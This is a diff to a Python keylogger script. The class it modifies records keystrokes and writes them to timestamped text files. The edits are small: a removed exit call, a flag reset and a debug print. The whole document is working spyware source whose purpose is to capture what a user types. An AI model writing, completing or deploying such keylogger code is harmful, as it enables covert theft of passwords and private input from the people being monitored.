@@ -14,6 +14,7 @@ def keylogger(starter):
     from datetime import datetime
     SEND_REPORT_EVERY =  10
     print("Keylogger has started")
+    
     class Keylogger:
         def __init__(self, interval, report_method="file"):
             self.interval = interval
@@ -46,8 +47,7 @@ def keylogger(starter):
             with open(f"{self.filename}.txt", "w") as f:
                 print(self.log, file=f)
             print (f"[+] Saved {self.filename}.txt")
-            exit(0)
-
+            
         def report(self):
             if self.log:
                 self.end_dt = datetime.now()
@@ -65,7 +65,8 @@ def keylogger(starter):
             self.report()
             print(f"{datetime.now()} - Started keylogger")
             keyboard.wait()
-
     if starter == 1:
+        starter = 0
         keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
         keylogger.start()
+    print("reached the end!")
